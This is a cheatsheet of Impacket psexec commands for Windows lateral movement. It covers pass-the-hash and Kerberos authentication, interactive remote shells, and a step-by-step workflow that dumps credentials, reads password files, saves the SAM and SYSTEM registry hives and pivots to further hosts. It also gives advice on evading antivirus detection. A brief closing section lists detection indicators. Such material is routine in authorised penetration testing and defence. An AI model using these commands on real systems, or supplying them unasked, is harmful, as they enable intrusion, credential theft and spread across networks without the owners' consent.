# Impacket PsExec Cheatsheet

## Basic Syntax

```bash
impacket-psexec [options] target
```

**Target format:** `[domain/]username[:password]@<targetName or address>`

---

## Authentication

### Password Authentication

```bash
impacket-psexec administrator:'P@ssw0rd'@192.168.1.10
```

### Pass-the-Hash

```bash
impacket-psexec -hashes :NTHASH administrator@192.168.1.10
impacket-psexec -hashes LMHASH:NTHASH DOMAIN/administrator@192.168.1.10
```

### Kerberos (ccache)

```bash
export KRB5CCNAME=/tmp/admin.ccache
impacket-psexec -k -no-pass DOMAIN/administrator@dc01.domain.local
```

### Kerberos (AES Key)

```bash
impacket-psexec -aesKey 000102030405060708090a0b0c0d0e0f0011223344556677889900aabbccddeeff -k DOMAIN/administrator@192.168.1.10
```

### Domain with DC-IP

```bash
impacket-psexec -hashes :HASH DOMAIN/administrator@192.168.1.10 -dc-ip 192.168.1.5
```

---

## Execution Modes

### Interactive Shell

```bash
impacket-psexec administrator:'P@ssw0rd'@192.168.1.10
# Opens C:\Windows\system32> prompt
# Full cmd.exe interactive session
```

### Single Command

```bash
impacket-psexec -hashes :HASH administrator@192.168.1.10 "whoami"
impacket-psexec -hashes :HASH administrator@192.168.1.10 "systeminfo"
```

---

## Common Options

| Flag | Description |
|------|-------------|
| `-hashes LMHASH:NTHASH` | NTLM pass-the-hash authentication |
| `-k` | Use Kerberos authentication |
| `-no-pass` | Don't prompt for password (use with `-k`) |
| `-aesKey hex` | AES key for Kerberos (128 or 256 bits) |
| `-dc-ip ip` | Domain controller IP address |
| `-target-ip ip` | Target IP (when target is NetBIOS name) |
| `-share SHARE` | Upload share (default: ADMIN$) |
| `-codec CODEC` | Output encoding (default: utf-8) |
| `-debug` | Enable debug output |
| `-ts` | Add timestamps to log output |

---

## Lateral Movement Workflow

```bash
# 1. Dump credentials from compromised host
impacket-secretsdump administrator:'P@ssw0rd'@192.168.1.10

# 2. Use hash to move laterally
impacket-psexec -hashes :NTHASH administrator@192.168.1.20

# 3. In the interactive shell
C:\Windows\system32> whoami
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> dir
C:\Users\Administrator\Desktop> type passwords.txt

# 4. Harvest more credentials
C:\> reg save HKLM\SAM C:\temp\sam.hive
C:\> reg save HKLM\SYSTEM C:\temp\system.hive

# 5. Download and parse (from attacker machine)
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 6. Continue pivoting
impacket-psexec -hashes :NEW_HASH administrator@192.168.1.30
```

---

## Quick Reference

```bash
# Basic connection
impacket-psexec admin:'password'@192.168.1.10

# Pass-the-hash (NT only)
impacket-psexec -hashes :334d1cdc94243215df022b101e206e administrator@192.168.1.10

# Domain pass-the-hash
impacket-psexec -hashes :NTHASH CORP/administrator@192.168.1.10

# Kerberos auth
impacket-psexec -k -no-pass CORP/administrator@dc01.corp.local

# Single command with debug
impacket-psexec -hashes :HASH administrator@192.168.1.10 "systeminfo" -debug -ts

# Custom share
impacket-psexec -share C$ administrator@192.168.1.10

# Non-UTF8 output
impacket-psexec -codec cp850 administrator@192.168.1.10
```

---

## PsExec vs SMBExec Comparison

```text
PsExec:
  ✓ Full interactive cmd.exe shell
  ✓ Named pipe for bidirectional I/O
  ✗ Uploads psexesvc.exe to disk
  ✗ More detectable by EDR/AV

SMBExec:
  ✓ No binary upload
  ✓ Lighter footprint
  ✓ Less detectable
  ✗ Semi-interactive only (not full cmd.exe)
  ✗ Output via file read, not pipe
```

---

## Error Handling

| Error | Fix |
|-------|-----|
| `STATUS_LOGON_FAILURE` | Wrong password or hash; verify credentials |
| `STATUS_ACCESS_DENIED` | Not admin; try different account |
| `STATUS_PIPE_NOT_AVAILABLE` | Named pipe blocked; try SMBExec |
| Binary detected by AV | Modify binary or use SMBExec |
| `Connection reset` | Firewall blocking; check port 445 |
| `KDC_ERR_PREAUTH_FAILED` | Wrong AES key or no TGT |
| `STATUS_BAD_NETWORK_NAME` | Share doesn't exist; try `-share C$` |

---

## Detection Indicators

- **Event ID 7045:** New service installed (PSEXESVC)
- **Event ID 7036:** Service started/stopped rapidly
- **Event ID 4624:** Logon Type 3 (Network) from unusual source
- **File drop:** `psexesvc.exe` in `C:\Windows\ADMIN$`
- **Named pipe:** `\\.\pipe\PSEXESVC*` creation
- **SMB traffic:** Unusual ADMIN$ share access patterns
